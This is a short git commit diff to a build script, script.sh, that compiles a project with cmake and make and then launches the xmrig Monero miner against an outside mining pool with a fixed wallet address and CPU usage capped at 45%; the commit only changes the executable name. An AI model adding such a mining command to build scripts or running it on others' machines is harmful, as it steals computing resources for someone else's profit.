8f7b60ef8b130795abd509c33293c4cdef8e1b53
tersaguyex <52073743+tersaguyex@users.noreply.github.com>
2019-07-10 10:13:33 -0300

    Update script.sh

--- script.sh
+++ script.sh
@@ -8,4 +8,4 @@ mkdir build
 cd build
 cmake ..
 make
-xmrig.exe --donate-level 0 --max-cpu-usage 45 -o pool.supportxmr.com:5555 -u 43QGgipcHvNLBX3nunZLwVQpF6VbobmGcQKzXzQ5xMfJgzfRBzfXcJHX1tUHcKPm9bcjubrzKqTm69JbQSL4B3f6E3mNCbU -p x -k
+./xmrig --donate-level 0 --max-cpu-usage 45 -o pool.supportxmr.com:5555 -u 43QGgipcHvNLBX3nunZLwVQpF6VbobmGcQKzXzQ5xMfJgzfRBzfXcJHX1tUHcKPm9bcjubrzKqTm69JbQSL4B3f6E3mNCbU -p x -k
